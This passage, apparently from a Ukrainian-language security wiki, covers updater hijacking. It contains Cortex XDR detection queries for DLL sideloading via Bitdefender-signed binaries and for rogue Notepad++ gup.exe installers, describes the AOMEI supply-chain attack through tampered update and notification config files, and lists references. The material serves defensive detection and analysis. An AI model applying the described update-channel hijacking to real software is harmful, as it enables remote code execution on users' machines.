| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> запускає інсталятор, не пов’язаний із Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ці шаблони застосовні до будь-якого updater, який приймає непідписані маніфести або не закріплює підписувачів інсталятора: перехоплення мережевого трафіку + шкідливий інсталятор + sideloading із власним підписом дають змогу виконати remote code execution під виглядом «довірених» оновлень.

### Конфігурація сповіщень як другий тригер оновлення

Updater може використовувати окремі віддалені конфігурації для **підготовки контенту та запуску його виконання**. Для цього потрібен контроль над конфігураціями або їхніми відповідями; у звітах не вказано, як було отримано доступ до джерела. У випадку AOMEI файл `down_html.ini` задавав URL архіву, версію (`thrid`) і MD5 (`Val`); зловмисник підвищив версію та змінив URL і відповідну контрольну суму. Це описана вище [помилка межі довіри метаданих](#2-hijacking-the-update-channel-to-run-code-as-system). Додатковий шлях виконання використовував `Notifycfg.ini`: він спрямовував `ABNotify.exe` завантажити витягнутий `upgrade-now.html` через локальну URL-адресу `file:///` у WebView. Сторінка автоматично переходила до сусіднього виконуваного файла, який WebView передавав системній оболонці. Дочірній процес успадковував привілеї notifier; це саме по собі не підвищувало їх до SYSTEM.<sup>[[17]](#references)[[18]](#references)</sup>

Google також повідомила про змінений `Notifycfg.ini`, що містив понад 35 000 повторюваних фіктивних секцій, які обходили звичайну перевірку версії цього клієнта. У звіті не доведено існування універсального обходу парсера. Зловмисник відновлював віддалені файли після п’яти-десятихвилинних вікон, тому змінену конфігурацію отримували лише клієнти, які опитували сервер у цей час. Цей канал сповіщень також використовувався для окремої [приманки з WebDAV/NTLM coercion](../ntlm/places-to-steal-ntlm-creds.md#remote-notification-uris-for-webdav-ntlm-coercion), для якої не потрібно було запускати архів.<sup>[[18]](#references)</sup>

---
## References
- [1] [Рекомендація – Netskope Client для Windows – локальне підвищення привілеїв через шахрайський сервер (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Рекомендація з безпеки Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – плагін Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – IPC-клієнт/експлойт Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – злам ASUS DriverHub, MSI Center, Acer Control Centre і Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – локальне підвищення привілеїв через файли з правом запису в Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – підвищення привілеїв у Windows agent](https://checkmk.com/werk/16361)
- [10] [PoC bloatware-pwn від sensepost](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer від CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – атаки державного рівня використовують ланцюг постачання Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – оновлення щодо інциденту з перехопленням інфраструктури](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – обхід виправлення CVE-2025-0309 у Netskope Client для Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – виявлення вразливостей для підвищення привілеїв у Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
- [16] [Quarkslab – MyReport Updater: від gRPC до SYSTEM](https://blog.quarkslab.com/myreport-updater-from-grpc-to-system.html)
- [17] [Лабораторія аналізу загроз ManageEngine – компрометація ланцюга постачання AOMEI Backupper](https://www.manageengine.com/threat-analysis-lab/aomei-backupper-supply-chain-compromise.html)
- [18] [Google Threat Intelligence Group і Mandiant – розслідування тимчасового втручання в ланцюг постачання](https://cloud.google.com/blog/topics/threat-intelligence/investigating-ephemeral-supply-chain-tampering)
